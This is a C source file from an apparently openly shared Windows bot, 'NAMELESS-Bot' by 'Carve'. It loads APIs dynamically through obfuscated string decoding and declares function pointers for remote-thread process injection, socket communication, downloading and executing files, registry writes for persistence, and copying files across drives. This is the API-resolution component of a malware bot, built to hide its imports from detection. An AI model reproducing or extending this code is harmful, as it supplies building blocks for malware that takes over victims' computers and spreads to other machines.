/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"
#include "strings_apis.h"

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

FARPROC my_CreateProcess;
FARPROC my_WSACleanup, my_WSAStartup, my_closesocket, my_connect, my_gethostbyname, my_htons, my_recv, my_send, my_socket, my_inet_addr, my_select;
FARPROC my_DownloadFile;
FARPROC my_URLDownloadToFile;
FARPROC my_ShellExecute, my_RegCreateKeyEx, my_RegSetValueEx, my_RegCloseKey, my_CheckTokenMembership;

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

// kernel32 - non injected
typedef HANDLE (WINAPI *myOP)(DWORD,BOOL,DWORD); // OpenProcess
typedef DWORD (WINAPI *myGMFN)(HMODULE,LPTSTR,DWORD); // GetModuleFileNameA
typedef LPVOID (WINAPI *myVIRTA)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD); // VirtualAllocEx
typedef HANDLE (WINAPI *myCRT)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD); // CreateRemoteThread

// kernel32 - injected
typedef DWORD (WINAPI *myWFSO)(HANDLE,DWORD); // WaitForSingleObject
typedef HANDLE (WINAPI *myCM)(LPSECURITY_ATTRIBUTES,BOOL,LPCTSTR); // CreateMutexA
typedef HANDLE (WINAPI *myCT)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD); // CreateThread
typedef VOID (WINAPI *myET)(DWORD); // ExitThread
typedef VOID (WINAPI *mySLP)(DWORD); // Sleep
typedef DWORD (WINAPI *myGTC)(void); // GetTickCount
typedef HANDLE (WINAPI *myCF)(LPCTSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE); // CreateFileA
typedef BOOL (WINAPI *myWF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED); // WriteFile
typedef BOOL (WINAPI *myCH)(HANDLE); // CloseHandle
typedef BOOL (WINAPI *myCP)(LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION); // CreateProcessA
typedef DWORD (WINAPI *myGLDS)(DWORD,LPTSTR); // GetLogicalDriveStringsA
typedef UINT (WINAPI *myGDT)(LPCTSTR); // GetDriveTypeA
typedef BOOL (WINAPI *mySFA)(LPCTSTR,DWORD); // SetFileAttributesA
typedef BOOL (WINAPI *myCFILE)(LPCTSTR,LPCTSTR,BOOL); // CopyFileA
typedef BOOL (WINAPI *myDFILE)(LPCTSTR); // DeleteFileA

// ws2_32
typedef int (WINAPI *myWSAS)(WORD,LPWSADATA); // WSAStartup
typedef SOCKET (WINAPI *mySOCK)(int,int,int); // socket
typedef int (WINAPI *myCON)(SOCKET,const struct sockaddr *,int); // connect
typedef unsigned long (WINAPI *myIADDR)(const char *); // inet_addr
typedef u_short (WINAPI *myHTONS)(u_short); // htons
typedef int (WINAPI *mySEND)(SOCKET,const char *,int,int); // send
typedef int (WINAPI *myRECV)(SOCKET,char *,int,int); // recv
typedef int (WINAPI *myCLSO)(SOCKET); // closesocket
typedef struct hostent* FAR (WINAPI *myGHBN)(const char *); // gethostbyname
typedef int (WINAPI *mySENDTO)(SOCKET,const char*,int,int,const struct sockaddr*,int); // sendto
typedef SOCKET (WINAPI *myWSASOCK)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD); // WSASocket

// shell32
typedef HINSTANCE (WINAPI *mySE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT); // ShellExecuteA

// advapi32
typedef LONG (WINAPI *myRCKE)(HKEY,LPCTSTR,DWORD,LPTSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD); // RegCreateKeyExA
typedef LONG (WINAPI *myRSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE *,DWORD); // RegSetValueExA
typedef LONG (WINAPI *myRCK)(HKEY); // RegCloseKey
typedef LONG (WINAPI *myRDK)(HKEY,LPCTSTR); // RegDeleteKeyA
typedef LONG (WINAPI *myRDV)(HKEY,LPCTSTR); // RegDeleteValueA
typedef BOOL( __stdcall *myCTM ) ( HANDLE, PSID, PBOOL ); //CheckTokenMembership;

typedef struct
{
// kernel32
    myGMFN GetModuleFileName;
    myWFSO WaitForSingleObject;
    myCM CreateMutex;
    myCT CreateThread;
    myET ExitThread;
    mySLP Sleep;
    myGTC GetTickCount;
    myCF CreateFile;
    myWF WriteFile;
    myCH CloseHandle;
    myCP CreateProcess;
    myGLDS GetLogicalDriveStrings;
    myGDT GetDriveType;
    mySFA SetFileAttributes;
    myCFILE CopyFile;
    myDFILE DeleteFile;
// ws2_32
    myWSAS WSAStartup;
    mySOCK socket;
    myCON connect;
    myIADDR inet_addr;
    myHTONS htons;
    mySEND send;
    myRECV recv;
    myCLSO closesocket;
    myGHBN gethostbyname;
    mySENDTO sendto;
// shell32
    mySE ShellExecute;
// advapi32
    myRCK RegCloseKey;
    myRSVE RegSetValueEx;
    myRCKE RegCreateKeyEx;
    myRDK RegDeleteKey;
    myRDV RegDeleteValue;
    myCTM CheckTokenMembership;
} ext_functions_s;

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

HMODULE 	kernel32_dll, shell32_dll, advapi32_dll, ws2_32_dll, urlmon_dll;

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void load_apis(void)
{
    kernel32_dll            = LoadLibrary(DecodeApis(kernel32_));
    shell32_dll             = LoadLibrary(DecodeApis(shell32_));
    advapi32_dll            = LoadLibrary(DecodeApis(advapi32_));
    ws2_32_dll              = LoadLibrary(DecodeApis(WS2_32_));
    urlmon_dll              = LoadLibrary(DecodeApis(urlmon_));

    my_CreateProcess        = (myCP)    GetProcAddress(kernel32_dll, DecodeApis(CreateProcess_));

    my_WSACleanup           =           GetProcAddress(ws2_32_dll, DecodeApis(WSACleanup_));
    my_WSAStartup           = (myWSAS)  GetProcAddress(ws2_32_dll, DecodeApis(WSAStartup_));
    my_closesocket          = (myCLSO)  GetProcAddress(ws2_32_dll, DecodeApis(closesocket_));
    my_connect              = (myCON)   GetProcAddress(ws2_32_dll, DecodeApis(connect_));
    my_gethostbyname        = (myGHBN)  GetProcAddress(ws2_32_dll, DecodeApis(gethostbyname_));
    my_htons                = (myHTONS) GetProcAddress(ws2_32_dll, DecodeApis(htons_));
    my_recv                 = (myRECV)  GetProcAddress(ws2_32_dll, DecodeApis(recv_));
    my_send                 = (mySEND)  GetProcAddress(ws2_32_dll, DecodeApis(send_));
    my_socket               = (mySOCK)  GetProcAddress(ws2_32_dll, DecodeApis(socket_));
    my_inet_addr            = (myIADDR) GetProcAddress(ws2_32_dll, DecodeApis(inet_addr_));
    my_select               =           GetProcAddress(ws2_32_dll, DecodeApis(select_));

    my_URLDownloadToFile    =           GetProcAddress(urlmon_dll, DecodeApis(URLDownloadToFile_));

    my_ShellExecute         = (mySE)    GetProcAddress(shell32_dll, DecodeApis(ShellExecute_));

    my_RegCloseKey          = (myRCK)   GetProcAddress(advapi32_dll, DecodeApis(RegCloseKey_));
    my_RegSetValueEx        = (myRSVE)  GetProcAddress(advapi32_dll, DecodeApis(RegSetValueEx_));
    my_RegCreateKeyEx       = (myRCKE)  GetProcAddress(advapi32_dll, DecodeApis(RegCreateKeyEx_));
    my_CheckTokenMembership = (myCTM)   GetProcAddress(advapi32_dll, DecodeApis(CheckTokenMembership_));
    //my_RegDeleteKey = (myRDK)         GetProcAddress(advapi32_dll, DecodeApis(RegDeleteKeyA));
    //my_RegDeleteValue = (myRDV)       GetProcAddress(advapi32_dll, DecodeApis(RegDeleteValueA));
}
